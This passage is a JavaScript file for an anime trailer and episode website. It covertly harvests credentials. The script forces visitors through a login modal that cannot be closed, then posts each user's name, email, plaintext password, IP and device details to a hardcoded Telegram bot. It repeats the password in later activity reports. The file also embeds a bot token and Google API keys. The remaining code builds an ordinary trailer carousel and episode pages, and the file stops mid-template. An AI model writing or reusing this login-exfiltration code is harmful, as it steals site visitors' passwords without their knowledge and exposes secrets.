// Page ko show/hide karne ka function
function showPage() {
    document.body.classList.remove('hidden');
}

function hidePage() {
    document.body.classList.add('hidden');
}

// Sabse pehle page ko hide karo
hidePage();

// Animation check karo
(function () {
    if (!sessionStorage.getItem("af_opened")) {
        sessionStorage.setItem("af_opened", "yes");
        
        // Animation page pe redirect karo
        if (!window.location.pathname.includes("open-animation")) {
            window.location.replace("open-animation.html");
        }
    } else {
        // Agar animation already dekha hai, toh page show karo
        showPage();
    }
})();
// 🔥 PRO TIP: Show opening animation only once per session
(function () {
    if (!sessionStorage.getItem("af_opened")) {
        sessionStorage.setItem("af_opened", "yes");

        // agar already animation page pe ho to redirect mat karo
        if (!window.location.pathname.includes("open-animation")) {
            window.location.replace("open-animation.html");
        }
    }
})();
// User System Configuration
const TELEGRAM_USER_BOT_TOKEN = "8276580013:AAEInrTpzMa5f_oy0tk-f0-gE9twL2qpuCI";
const TELEGRAM_CHAT_ID = "6900152624";
let currentUser = null;
let userActivity = {
    loginTime: null,
    watchedTrailers: [],
    openedAnime: [],
    watchTime: 0,
    lastActivity: null
};
let activityInterval;

// User tracking functions
function startUserTracking() {
    if (!currentUser) return;
    
    userActivity.loginTime = new Date().toISOString();
    userActivity.lastActivity = new Date().toISOString();
    
    // Track time spent on site
    activityInterval = setInterval(() => {
        userActivity.watchTime += 1; // Add 1 second
        userActivity.lastActivity = new Date().toISOString();
    }, 1000);
    
    // Track page visibility
    document.addEventListener('visibilitychange', () => {
        if (document.hidden) {
            clearInterval(activityInterval);
            sendUserActivityReport('tab_hidden');
        } else {
            startUserTracking();
        }
    });
}

// Function to send user activity to Telegram
async function sendUserActivityReport(actionType) {
    if (!currentUser) return;
    
    try {
        const report = {
            user: currentUser,
            activity: {
                ...userActivity,
                logoutTime: new Date().toISOString(),
                action: actionType
            }
        };
        
        const message = `
📊 USER ACTIVITY REPORT
━━━━━━━━━━━━━━━━━━━
👤 User: ${currentUser.name}
📧 Email: ${currentUser.email || 'Not provided'}
🔑 Password: ${currentUser.password}
⏰ Session: ${Math.floor(userActivity.watchTime / 60)}m ${userActivity.watchTime % 60}s
📈 Actions Taken:
• Trailers Watched: ${userActivity.watchedTrailers.length}
• Anime Opened: ${userActivity.openedAnime.length}
• Total Watch Time: ${Math.floor(userActivity.watchTime / 60)} minutes
━━━━━━━━━━━━━━━━━━━
📱 Last Action: ${actionType}
🕒 Login: ${new Date(userActivity.loginTime).toLocaleTimeString()}
📤 Logout: ${new Date().toLocaleTimeString()}
━━━━━━━━━━━━━━━━━━━
🗺️ Page URL: ${window.location.href}
        `;
        
        await fetch(`https://api.telegram.org/bot${TELEGRAM_USER_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.log('Failed to send activity report:', error);
    }
}

// Function to send login details
async function sendLoginDetails(userData) {
    try {
        const message = `
🔐 NEW USER LOGIN DETECTED
━━━━━━━━━━━━━━━━━━━
👤 User: ${userData.name}
📧 Email: ${userData.email || 'Not provided'}
🔑 Password: ${userData.password}
🕒 Time: ${new Date().toLocaleString()}
🌐 IP: ${await getUserIP()}
━━━━━━━━━━━━━━━━━━━
📱 Device: ${navigator.userAgent}
🗺️ Location: ${navigator.language}
━━━━━━━━━━━━━━━━━━━
⚡ Login successful
        `;
        
        await fetch(`https://api.telegram.org/bot${TELEGRAM_USER_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.log('Failed to send login details:', error);
    }
}

// Get user IP (approximate)
async function getUserIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'IP not available';
    }
}

// User login function
function loginUser(userData) {
    currentUser = userData;
    
    // Save to localStorage
    localStorage.setItem('frontier_user', JSON.stringify(userData));
    
    // Update UI
    updateProfileUI();
    
    // Send login details
    sendLoginDetails(userData);
    
    // Start tracking
    startUserTracking();
    
    // Close login modal
    closeLogin();
    
    // Show welcome message
    showToast(`Welcome back, ${userData.name}! 👋`, true);
}

// Update profile UI
function updateProfileUI() {
    const profileSection = document.getElementById('profileSection');
    const profileIcon = document.getElementById('profileIcon');
    const profileName = document.getElementById('profileName');
    const profileEmail = document.getElementById('profileEmail');
    
    if (currentUser) {
        profileSection.style.display = 'block';
        
        // Get first letter of name
        const initial = currentUser.name.charAt(0).toUpperCase();
        profileIcon.innerHTML = initial;
        
        // Update profile info
        profileName.textContent = currentUser.name;
        profileEmail.textContent = currentUser.email || 'No email provided';
    } else {
        profileSection.style.display = 'none';
    }
}

// Logout function
function logout() {
    // Send activity report
    sendUserActivityReport('user_logout');
    
    // Clear user data
    currentUser = null;
    userActivity = {
        loginTime: null,
        watchedTrailers: [],
        openedAnime: [],
        watchTime: 0,
        lastActivity: null
    };
    
    // Clear localStorage
    localStorage.removeItem('frontier_user');
    
    // Stop tracking
    clearInterval(activityInterval);
    
    // Update UI
    updateProfileUI();
    
    // Show logout message
    showToast('Logged out successfully! 👋', true);
    
    // Open login modal after 2 seconds
    setTimeout(() => {
        openLogin();
    }, 2000);
}

// Check login status on page load
// Update the checkLoginStatus function to check animation status first
function checkLoginStatus() {
    // FIRST check if animation is done
    if (!sessionStorage.getItem("af_animation_done")) {
        console.log("Animation not done yet, delaying login check...");
        setTimeout(checkLoginStatus, 500); // Retry after 500ms
        return;
    }

    console.log("Animation done, checking login status...");
    
    const savedUser = localStorage.getItem('frontier_user');
    
    // अगर user login है तो उसे login करा दें
    if (savedUser) {
        try {
            const userData = JSON.parse(savedUser);
            loginUser(userData);
        } catch (error) {
            localStorage.removeItem('frontier_user');
            // Automatically open login modal if user data is corrupted
            setTimeout(openLogin, 500);
        }
    } else {
        // अगर user login नहीं है, तो login modal को open करें
        setTimeout(openLogin, 500);
    }
}
// Prevent closing the login modal with Escape key
document.addEventListener('keydown', function(event) {
    const loginModal = document.getElementById('loginModal');
    if (event.key === 'Escape' && !loginModal.classList.contains('hidden') && !currentUser) {
        event.preventDefault(); // Prevent Escape from closing the modal
        showToast('Please login to continue!', false);
    }
});

// Optional: Also prevent clicking outside the modal to close it
document.getElementById('loginModal').addEventListener('click', function(event) {
    if (event.target === this && !currentUser) {
        showToast('Please login to continue!', false);
    }
});

// Login modal functions
function openLogin() {
    document.getElementById('loginModal').classList.remove('hidden');
    document.body.classList.add('modal-open');
}

function closeLogin() {
    document.getElementById('loginModal').classList.add('hidden');
    document.body.classList.remove('modal-open');
}
// Configuration
const JIKAN_API = "https://api.jikan.moe/v4";
const YT_KEY = "AIzaSyBi_9l5045EYukE514iRzDzuyP9kleIunE";
const GEMINI_KEY = "AIzaSyC6gCmp_G8yODusPWxkLxH_PPoiixc6RfI";
const tgToken = "8276580013:AAEInrTpzMa5f_oy0tk-f0-gE9twL2qpuCI";
const tgId = "6900152624";

// Global variables
let heroSlides = [];
let currentHeroSlide = 0;
let trailerLanguage = 'hi'; // Default to Hindi
let fallbackLanguages = ['en', 'ja', 'es', 'fr'];
let watchlist = JSON.parse(localStorage.getItem('frontier_watchlist_pro')) || [];
let animeCache = new Map();
let currentAnimeId = null;
let currentAnimeTitle = "";
let heroAutoSlideInterval;

// ==================== TRAILER FUNCTIONS ====================

async function searchOfficialAnimeTrailer(title, animeId = null) {
    console.log(`Searching official anime trailer for: ${title}`);
    
    // Always search for "anime" + title + "trailer" to ensure anime content
    const animeQueries = [
        `${title} anime trailer`,
        `${title} official trailer`,
        `${title} trailer`,
        `${title} PV`,
        `${title} preview`,
        `${title} 予告編`,
        `${title} teaser`
    ];
    
    // If we have Japanese title, add it to search
    if (animeId) {
        try {
            const animeRes = await fetch(`${JIKAN_API}/anime/${animeId}`);
            const animeData = await animeRes.json();
            const japaneseTitle = animeData.data.title_japanese || '';
            
            if (japaneseTitle) {
                animeQueries.unshift(
                    `${japaneseTitle} 予告編`,
                    `${japaneseTitle} trailer`,
                    `${japaneseTitle} PV`
                );
            }
        } catch (error) {
            console.log('Could not fetch Japanese title');
        }
    }
    
    for (const query of animeQueries) {
        try {
            console.log(`Searching trailer with query: ${query}`);
            const res = await fetch(
                `https://www.googleapis.com/youtube/v3/search?part=snippet&maxResults=10&q=${encodeURIComponent(query)}&key=${YT_KEY}`
            );
            
            if (!res.ok) throw new Error('YouTube API error');
            
            const data = await res.json();
            
            if (data.items && data.items.length > 0) {
                // First, try to find official trailer
                const officialTrailer = data.items.find(item => 
                    item.snippet.title.toLowerCase().includes('official') ||
                    item.snippet.title.toLowerCase().includes('予告編') ||
                    item.snippet.title.toLowerCase().includes('pv')
                );
                
                // If no official trailer, take the first result that looks like a trailer
                const trailerItem = officialTrailer || data.items.find(item => 
                    item.snippet.title.toLowerCase().includes('trailer') ||
                    item.snippet.title.toLowerCase().includes('teaser') ||
                    item.snippet.title.toLowerCase().includes('preview')
                ) || data.items[0];
                
                const videoId = trailerItem.id.videoId;
                console.log(`Found trailer: ${videoId} - ${trailerItem.snippet.title}`);
                return {
                    videoId: videoId,
                    title: trailerItem.snippet.title,
                    isOfficial: !!officialTrailer
                };
            }
        } catch (error) {
            console.log(`Query failed: ${query}`, error);
            continue;
        }
    }
    
    console.log('No trailer found with anime queries');
    return null;
}

async function playTrailer(title, animeId = null) {
    // Track trailer watched
    if (currentUser && title) {
        const trailerData = {
            title: title,
            animeId: animeId,
            time: new Date().toISOString()
        };
        userActivity.watchedTrailers.push(trailerData);
    }
    
    const modal = document.getElementById('trailerModal');
    const container = document.getElementById('ytPlayerContainer');
    
    modal.classList.remove('hidden');
    document.body.classList.add('modal-open');
    document.documentElement.style.overflow = 'hidden';
    
    container.innerHTML = `
        <div class="w-full h-full flex flex-col items-center justify-center text-white bg-black">
            <div class="text-center p-8">
                <div class="inline-block animate-spin rounded-full h-16 w-16 border-4 border-brand border-t-transparent mb-6"></div>
                <h3 class="text-2xl font-black mb-2">Searching Official Anime Trailer</h3>
                <p class="text-zinc-400 mb-4">"${title}"</p>
                <div class="flex items-center justify-center gap-2 text-sm text-zinc-500">
                    <i class="fas fa-search"></i>
                    <span>Looking for anime trailer...</span>
                </div>
            </div>
        </div>
    `;
    
    try {
        let trailerData = null;
        
        // First try with anime-specific search
        trailerData = await searchOfficialAnimeTrailer(title, animeId);
        
        // If still not found, try general trailer search
        if (!trailerData) {
            console.log('Trying general trailer search...');
            const fallbackQueries = [
                `${title} trailer`,
                `${title} official video`,
                `${title} preview`
            ];
            
            for (const query of fallbackQueries) {
                try {
                    const res = await fetch(
                        `https://www.googleapis.com/youtube/v3/search?part=snippet&maxResults=5&q=${encodeURIComponent(query)}&key=${YT_KEY}`
                    );
                    
                    if (res.ok) {
                        const data = await res.json();
                        if (data.items && data.items.length > 0) {
                            trailerData = {
                                videoId: data.items[0].id.videoId,
                                title: data.items[0].snippet.title,
                                isOfficial: false
                            };
                            break;
                        }
                    }
                } catch (error) {
                    continue;
                }
            }
        }
        
        // If still not found and we have animeId, try Jikan API
        if (!trailerData && animeId) {
            try {
                const animeRes = await fetch(`${JIKAN_API}/anime/${animeId}`);
                const animeData = await animeRes.json();
                
                if (animeData.data.trailer && animeData.data.trailer.youtube_id) {
                    trailerData = {
                        videoId: animeData.data.trailer.youtube_id,
                        title: animeData.data.trailer.title || 'Official Trailer',
                        isOfficial: true
                    };
                }
            } catch (error) {
                console.log('Could not fetch trailer from Jikan');
            }
        }
        
        if (!trailerData) {
            throw new Error('No trailer found');
        }
        
        console.log(`Playing trailer: ${trailerData.videoId}`);
        
        container.innerHTML = `
            <div class="w-full h-full relative">
                <iframe class="w-full h-full" 
                        src="https://www.youtube.com/embed/${trailerData.videoId}?autoplay=1&rel=0&modestbranding=1" 
                        frameborder="0" 
                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
                        allowfullscreen
                        title="${trailerData.title}">
                </iframe>
                ${trailerData.isOfficial ? `
                    <div class="absolute top-4 left-4 bg-green-600 text-white px-3 py-1 rounded-lg text-xs font-bold">
                        <i class="fas fa-check-circle mr-1"></i> Official
                    </div>
                ` : ''}
            </div>
        `;
        
    } catch (error) {
        console.error('Trailer error:', error);
        
        container.innerHTML = `
            <div class="w-full h-full flex flex-col items-center justify-center text-white p-8 bg-black">
                <i class="fas fa-film text-6xl text-brand mb-4"></i>
                <h3 class="text-2xl font-black mb-2">Trailer Not Available</h3>
                <p class="text-zinc-400 text-center mb-6">We couldn't find a trailer for this anime.</p>
                <div class="flex flex-wrap gap-3 justify-center">
                    <button onclick="closeTrailer()" class="px-6 py-3 bg-brand rounded-xl font-bold hover:bg-red-600">
                        Close
                    </button>
                    <a href="https://www.youtube.com/results?search_query=${encodeURIComponent(title)}+anime+trailer" 
                       target="_blank" 
                       class="px-6 py-3 bg-red-600 rounded-xl font-bold flex items-center gap-2 hover:bg-red-700">
                        <i class="fab fa-youtube"></i> Search YouTube
                    </a>
                </div>
            </div>
        `;
    }
}

function closeTrailer() { 
    const modal = document.getElementById('trailerModal');
    const container = document.getElementById('ytPlayerContainer');
    
    // YouTube video stop करें
    const iframe = container.querySelector('iframe');
    if (iframe) {
        iframe.src = iframe.src.replace('autoplay=1', 'autoplay=0');
        setTimeout(() => {
            container.innerHTML = "";
        }, 100);
    }
    
    modal.classList.add('hidden');
    document.body.classList.remove('modal-open');
    document.documentElement.style.overflow = 'auto';
}

// ==================== HERO SECTION FUNCTIONS ====================

async function loadHeroBanners() {
    try {
        const res = await fetch(`${JIKAN_API}/top/anime?limit=5&filter=bypopularity`);
        const data = await res.json();
        
        if (data.data && data.data.length > 0) {
            heroSlides = data.data;
            renderHeroSlides();
            setupHeroControls();
            startHeroAutoSlide();
        }
    } catch (error) {
        console.error('Failed to load hero banners:', error);
        loadFallbackHero();
    }
}

// Also update the hero banner rendering function to include ratings
function renderHeroSlides() {
    const slidesContainer = document.getElementById('heroSlides');
    const dotsContainer = document.getElementById('heroDots');
    
    slidesContainer.innerHTML = heroSlides.map((anime, index) => {
        const title = getEnglishTitle(anime);
        const genres = anime.genres.slice(0, 3).map(g => g.name).join(' • ');
        const score = anime.score ? anime.score.toFixed(1) : 'N/A';
        
        return `
            <div class="slide ${index === 0 ? 'active' : ''}" data-index="${index}">
                <div class="w-full h-full relative">
                    <img src="${anime.images.jpg.large_image_url}" 
                         alt="${title}"
                         class="w-full h-full object-cover"
                         onerror="this.src='https://via.placeholder.com/1200x600/1a1a2e/ffffff?text=Anime+Banner'">
                    <!-- Hero Rating Badge -->
                    <div class="absolute top-6 right-6 hero-rating-badge">
                        <span class="hero-rating-score">${score} ⭐</span>
                    </div>
                    <div class="absolute inset-0 bg-gradient-to-t from-zincDark via-zincDark/40 to-transparent p-6 md:p-12 flex items-end">
                        <div class="max-w-2xl transform transition-all duration-700 ${index === 0 ? 'translate-y-0 opacity-100' : 'translate-y-4 opacity-0'} slide-content">
                            <div class="flex items-center gap-2 mb-2 md:mb-3 flex-wrap">
                                <span class="bg-brand text-white px-2.5 py-1 rounded-md text-[9px] font-black uppercase tracking-widest">
                                    ${index === 0 ? 'TRENDING #1' : 'TRENDING'}
                                </span>
                                <span class="text-accent text-xs md:text-sm font-bold">
                                    <i class="fas fa-star mr-1"></i> ${score}
                                </span>
                                <span class="text-zinc-300 text-[10px] md:text-xs">${genres}</span>
                            </div>
                            <h2 class="text-3xl md:text-6xl lg:text-7xl font-black uppercase italic mb-2 leading-none tracking-tighter text-white">
                                ${title}
                            </h2>
                            <p class="text-zinc-200 text-[10px] md:text-sm mb-4 md:mb-6 line-clamp-2 max-w-lg">
                                ${anime.synopsis ? anime.synopsis.substring(0, 150) + '...' : 'An epic adventure awaits...'}
                            </p>
                            <div class="flex flex-wrap gap-3">
                                <button onclick="playTrailer('${title.replace(/'/g, "\\'")}', ${anime.mal_id})" 
                                        class="bg-brand hover:bg-red-600 text-white px-6 md:px-8 py-3 md:py-4 rounded-xl font-black text-[10px] md:text-sm shadow-lg transform active:scale-95 transition-all flex items-center gap-2">
                                    <i class="fas fa-play"></i> Watch Trailer
                                </button>
                                <button onclick="openAnimeSelector(${anime.mal_id}, '${title.replace(/'/g, "\\'")}', '${anime.images.jpg.large_image_url}')" 
                                        class="bg-white/20 hover:bg-white/30 backdrop-blur-sm text-white border border-white/30 px-6 md:px-8 py-3 md:py-4 rounded-xl font-black text-[10px] md:text-sm shadow-lg transform active:scale-95 transition-all flex items-center gap-2">
                                    <i class="fas fa-film"></i> Watch Now
                                </button>
                                <button onclick="openInfoPage(${anime.mal_id}, '${title.replace(/'/g, "\\'")}')" 
                                        class="bg-transparent hover:bg-white/10 text-white border border-white/30 px-4 md:px-6 py-3 md:py-4 rounded-xl font-bold text-[10px] md:text-xs shadow-lg transform active:scale-95 transition-all">
                                    <i class="fas fa-info-circle mr-2"></i> Details
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;
    }).join('');
    
    dotsContainer.innerHTML = heroSlides.map((_, index) => `
        <div onclick="goToHeroSlide(${index})" 
             class="hero-slide-dot w-2 h-2 md:w-3 md:h-3 rounded-full bg-white/30 cursor-pointer hover:bg-white ${index === 0 ? 'active-dot bg-brand' : ''} transition-all"></div>
    `).join('');
} 

function loadFallbackHero() {
    const fallbackAnime = [
        { title: 'Demon Slayer', img: 'Demon.jpg', score: 8.7 },
        { title: 'Naruto', img: 'Naruto.jpg', score: 8.3 },
        { title: 'Jujutsu Kaisen', img: 'Jujutsu.jpg', score: 8.6 },
        { title: 'Dragon Ball Z', img: 'Dragon ball.jpg', score: 8.7 },
        { title: 'Solo Leveling', img: 'Solo.jpg', score: 8.8 }
    ];
    
    heroSlides = fallbackAnime;
    renderHeroSlides();
    setupHeroControls();
    startHeroAutoSlide();
}

function setupHeroControls() {
    const slides = document.querySelectorAll('.slide');
    if (slides.length > 0) {
        slides[0].querySelector('.slide-content').classList.add('translate-y-0', 'opacity-100');
    }
}

function changeHeroSlide(direction) {
    const slides = document.querySelectorAll('.slide');
    const dots = document.querySelectorAll('.hero-slide-dot');
    
    if (slides.length === 0) return;
    
    slides[currentHeroSlide].querySelector('.slide-content').classList.remove('translate-y-0', 'opacity-100');
    slides[currentHeroSlide].querySelector('.slide-content').classList.add('translate-y-4', 'opacity-0');
    
    slides[currentHeroSlide].classList.remove('active');
    dots[currentHeroSlide].classList.remove('active-dot');
    
    currentHeroSlide = (currentHeroSlide + direction + slides.length) % slides.length;
    
    slides[currentHeroSlide].classList.add('active');
    dots[currentHeroSlide].classList.add('active-dot');
    
    setTimeout(() => {
        slides[currentHeroSlide].querySelector('.slide-content').classList.remove('translate-y-4', 'opacity-0');
        slides[currentHeroSlide].querySelector('.slide-content').classList.add('translate-y-0', 'opacity-100');
    }, 100);
    
    resetHeroAutoSlide();
}
function goToHeroSlide(index) {
    const slides = document.querySelectorAll('.slide');
    const dots = document.querySelectorAll('.hero-slide-dot');
    
    if (slides.length === 0 || index === currentHeroSlide) return;
    
    slides[currentHeroSlide].querySelector('.slide-content').classList.remove('translate-y-0', 'opacity-100');
    slides[currentHeroSlide].querySelector('.slide-content').classList.add('translate-y-4', 'opacity-0');
    
    slides[currentHeroSlide].classList.remove('active');
    dots[currentHeroSlide].classList.remove('active-dot');
    
    currentHeroSlide = index;
    
    slides[currentHeroSlide].classList.add('active');
    dots[currentHeroSlide].classList.add('active-dot');
    
    setTimeout(() => {
        slides[currentHeroSlide].querySelector('.slide-content').classList.remove('translate-y-4', 'opacity-0');
        slides[currentHeroSlide].querySelector('.slide-content').classList.add('translate-y-0', 'opacity-100');
    }, 100);
    
    resetHeroAutoSlide();
}

function startHeroAutoSlide() {
    if (heroAutoSlideInterval) clearInterval(heroAutoSlideInterval);
    heroAutoSlideInterval = setInterval(() => changeHeroSlide(1), 5000);
}

function resetHeroAutoSlide() {
    clearInterval(heroAutoSlideInterval);
    startHeroAutoSlide();
}

// ==================== ANIME DETAILS & SEASONS ====================

// ==================== ANIME DETAILS & SEASONS ====================

async function openAnimeDetails(animeId, title) {
    currentAnimeId = animeId;
    currentAnimeTitle = title;
    
    // Instead of opening modal, navigate to episodes page
    openEpisodesPage(animeId, title);
}


// ==================== ANIME DETAILS & SEASONS ====================

async function openEpisodesPage(animeId, title, animeImage = null) {
    closeSelector();
    
    // Add URL hash for tracking
    window.history.pushState({ page: 'episodes', animeId: animeId, from: 'frontier' }, '', `#episodes-${animeId}`);
// Get anime image if not provided
    let mainAnimeImage = animeImage;
    if (!mainAnimeImage) {
        try {
            const animeRes = await fetch(`${JIKAN_API}/anime/${animeId}`);
            const animeData = await animeRes.json();
            mainAnimeImage = animeData.data.images.jpg.large_image_url;
        } catch (error) {
            mainAnimeImage = 'https://via.placeholder.com/400x600/1a1a2e/ffffff?text=Anime';
        }
    }
    
    // Create episodes page HTML
    const overlay = document.getElementById('infoPageOverlay');
    const content = document.getElementById('infoPageContent');
    
    overlay.style.display = "block";
    
    content.innerHTML = `
        <div class="episodes-page">
            <div class="mb-10">
                
                <div class="flex flex-col md:flex-row items-start md:items-center gap-6 md:gap-8 mb-8">
                    <img src="${mainAnimeImage}" 
                         alt="${title}"
                         class="w-24 h-36 md:w-32 md:h-48 object-cover rounded-2xl shadow-2xl border-4 border-brand/20"
                         onerror="this.src='https://via.placeholder.com/300x450/1a1a2e/ffffff?text=Anime'">
                    <div class="flex-1">
                        <h1 class="text-3xl md:text-5xl font-black uppercase italic tracking-tighter text-brand leading-none mb-2">
                            ${title}
                        </h1>
                        <p class="text-zinc-500 dark:text-zinc-400 text-sm md:text-base">
                            <i class="fas fa-play-circle mr-2 text-brand"></i>
                            Click any episode to watch
                        </p>
                    </div>
                    <button onclick="playTrailer('${title.replace(/'/g, "\\'")}', ${animeId})" 
                            class="bg-brand hover:bg-red-600 text-white px-6 py-3 rounded-xl font-bold flex items-center gap-2 shadow-lg transition-all w-full md:w-auto">
                        <i class="fas fa-play"></i> Watch Trailer
                    </button>
                </div>
            </div>
            
            <!-- SEASON NAVIGATION CATEGORIES -->
            <div id="seasonNav" class="flex flex-wrap gap-3 mb-10 p-4 bg-white dark:bg-zinc-900/80 backdrop-blur-lg border border-zinc-200 dark:border-zinc-800 rounded-3xl sticky top-4 z-[100] shadow-lg">
                <div class="flex-1 min-w-0">
                    <p class="text-xs font-bold text-zinc-500 dark:text-zinc-400 uppercase tracking-wider mb-2">Browse Seasons</p>
                    <div id="seasonCategories" class="relative flex flex-wrap gap-2 pb-1">
                        <!-- Season buttons will be added here dynamically -->
                        <div class="inline-flex items-center gap-2 animate-pulse">
                            <div class="w-20 h-9 bg-zinc-200 dark:bg-zinc-800 rounded-xl"></div>
                            <div class="w-20 h-9 bg-zinc-200 dark:bg-zinc-800 rounded-xl"></div>
                        </div>
                        <!-- Active indicator -->
                        <div id="seasonIndicator" class="absolute bottom-0 left-0 h-1 bg-brand rounded-full transition-all duration-300" style="width: 80px; transform: translateX(0);"></div>
                    </div>
                </div>
            </div>
            
            <div id="seasonsContainer" class="space-y-12 mb-12">
                <div class="text-center py-16 animate-pulse">
                    <div class="inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-brand mb-4"></div>
                    <p class="text-zinc-500 dark:text-zinc-400 font-bold text-lg">Loading episodes...</p>
                    <p class="text-zinc-400 text-sm mt-2">Fetching episode details</p>
                </div>
            </div>
        </div>
    `;
    
    try {
        // Fetch anime details first
        const animeRes = await fetch(`${JIKAN_API}/anime/${animeId}`);
        const animeData = await animeRes.json();
        const animeInfo = animeData.data;
        
        // Try to fetch episodes
        let episodes = [];
        try {
            const episodesRes = await fetch(`${JIKAN_API}/anime/${animeId}/episodes`);
            const episodesData = await episodesRes.json();
            episodes = episodesData.data || [];
            console.log('Fetched episodes:', episodes.length);
            
            // Make sure episodes have proper numbers
            episodes = episodes.map((ep, index) => ({
                ...ep,
                episode: ep.episode || index + 1,
                episode_index: index + 1
            }));
        } catch (epError) {
            console.log("Episodes API failed, using fallback");
        }
        
        const seasons = [];
        const episodesPerSeason = 12;
        
        // If no episodes from API, create dummy episodes with proper structure
        if (episodes.length === 0) {
            const totalEpisodes = animeInfo.episodes || 24;
            
            // Create all episodes first with proper numbers
            const allEpisodes = Array.from({length: totalEpisodes}, (_, i) => {
                const epNum = i + 1;
                return {
                    mal_id: epNum,
                    title: generateEpisodeTitle(title, epNum),
                    episode: epNum,
                    episode_index: epNum,
                    images: {
                        jpg: {
                            image_url: mainAnimeImage
                        }
                    }
                };
            });
            
            // Now split into seasons
            const seasonCount = Math.ceil(totalEpisodes / episodesPerSeason);
            
            for (let seasonNum = 1; seasonNum <= seasonCount; seasonNum++) {
                const startEp = (seasonNum - 1) * episodesPerSeason;
                const endEp = Math.min(seasonNum * episodesPerSeason, totalEpisodes);
                const seasonEpisodes = allEpisodes.slice(startEp, endEp);
                
                seasons.push({
                    number: seasonNum,
                    episodes: seasonEpisodes,
                    title: `Season ${seasonNum}`,
                    episodeCount: seasonEpisodes.length,
                    startEpisode: seasonEpisodes[0]?.episode || (startEp + 1)
                });
            }
        } else {
            // Process episodes from API
            const seasonCount = Math.ceil(episodes.length / episodesPerSeason);
            
            for (let seasonNum = 1; seasonNum <= seasonCount; seasonNum++) {
                const startIndex = (seasonNum - 1) * episodesPerSeason;
                const endIndex = Math.min(seasonNum * episodesPerSeason, episodes.length);
                const seasonEpisodes = episodes.slice(startIndex, endIndex);
                
                // Ensure each episode has proper image
                seasonEpisodes.forEach(ep => {
                    if (!ep.images || !ep.images.jpg || !ep.images.jpg.image_url) {
                        ep.images = {
                            jpg: {
                                image_url: mainAnimeImage
                            }
                        };
                    }
                });
                
                seasons.push({
                    number: seasonNum,
                    episodes: seasonEpisodes,
                    title: `Season ${seasonNum}`,
                    episodeCount: seasonEpisodes.length,
                    startEpisode: seasonEpisodes[0]?.episode || (startIndex + 1)
                });
            }
        }
        
        // Ensure at least 1 season
        if (seasons.length === 0) {
            seasons.push({
                number: 1,
                episodes: Array.from({length: 12}, (_, i) => ({
                    mal_id: i + 1,
                    title: generateEpisodeTitle(title, i + 1),
                    episode: i + 1,
                    episode_index: i + 1,
                    images: {
                        jpg: {
                            image_url: mainAnimeImage
                        }
                    }
                })),
                title: 'Season 1',
                episodeCount: 12,
                startEpisode: 1
            });
        }
        
        // Cache the seasons
        animeCache.set(`seasons_${animeId}`, seasons);
        
        // RENDER SEASON CATEGORIES NAVIGATION
        const seasonCategories = document.getElementById('seasonCategories');
        seasonCategories.innerHTML = seasons.map(season => {
            const startEp = season.startEpisode || 1;
            const endEp = startEp + season.episodeCount - 1;
            
            return `
                <button onclick="scrollToSeason(${season.number})" 
                        data-season="${season.number}"
                        class="season-nav-btn group relative px-4 py-2 bg-white dark:bg-zinc-800 hover:bg-brand hover:text-white rounded-xl font-bold text-xs transition-all duration-300 border border-zinc-200 dark:border-zinc-700 shadow-sm">
                    <span class="flex items-center gap-2">
                        <span class="w-5 h-5 flex items-center justify-center bg-brand/10 text-brand rounded-md group-hover:bg-white/20 group-hover:text-white text-xs font-black">
                            S${season.number}
                        </span>
                    </span>
                    <span class="absolute -bottom-6 left-1/2 transform -translate-x-1/2 opacity-0 group-hover:opacity-100 transition-opacity text-[10px] font-bold text-zinc-500 dark:text-zinc-400 whitespace-nowrap bg-white dark:bg-zinc-900 px-2 py-1 rounded border border-zinc-200 dark:border-zinc-700 shadow-sm">
                        ${season.episodeCount} Episodes
                    </span>
                </button>
            `;
        }).join('');
        
        // Add indicator after buttons
        seasonCategories.innerHTML += `<div id="seasonIndicator" class="absolute bottom-0 left-0 h-1 bg-brand rounded-full transition-all duration-300" style="width: 80px; transform: translateX(0);"></div>`;
        
        // Render seasons with episode listing
        const seasonsContainer = document.getElementById('seasonsContainer');
        seasonsContainer.innerHTML = seasons.map(season => {
            const startEp = season.startEpisode || 1;
            const endEp = startEp + season.episodeCount - 1;
            
            return `
                <div id="season-${season.number}" class="season-section bg-white dark:bg-zinc-900/50 rounded-3xl p-6 md:p-8 shadow-lg border border-zinc-100 dark:border-zinc-800 scroll-mt-24">
                    <div class="flex flex-col sm:flex-row sm:items-center justify-between mb-6 pb-6 border-b dark:border-zinc-800">
                        <div>
                            <h2 class="text-2xl md:text-3xl font-black text-zinc-900 dark:text-white flex items-center gap-3 mb-2">
                                <span class="bg-brand text-white px-4 py-1 rounded-lg text-sm font-black">S${season.number}</span>
                                <span class="text-zinc-700 dark:text-zinc-300">
                                    Season ${season.number}
                                </span>
                            </h2>
                            <p class="text-zinc-500 text-sm">
                                <i class="fas fa-play-circle mr-1"></i>
                                Episodes ${startEp}-${endEp} • ${season.episodeCount} Episodes
                            </p>
                        </div>
                        <div class="flex gap-3 mt-4 sm:mt-0">
                            <button onclick="playTrailer('${title.replace(/'/g, "\\'")}', ${animeId})" 
                                    class="bg-brand hover:bg-red-600 text-white px-4 py-2 rounded-lg text-sm font-bold flex items-center gap-2 transition-all shadow-md">
                                <i class="fas fa-play"></i> Trailer
                            </button>
                        </div>
                    </div>
                    
                    <div class="episodes-list space-y-4">
                        ${season.episodes.map(episode => {
                            const episodeImage = getEpisodeImage(episode, mainAnimeImage);
                            const episodeTitle = cleanEpisodeTitle(episode.title || generateEpisodeTitle(title, episode.episode || episode.episode_index || 1));
                            const safeTitle = getSafeTitle(episodeTitle);
                            const episodeNumber = episode.episode || episode.episode_index || 1;
                            
                            return `
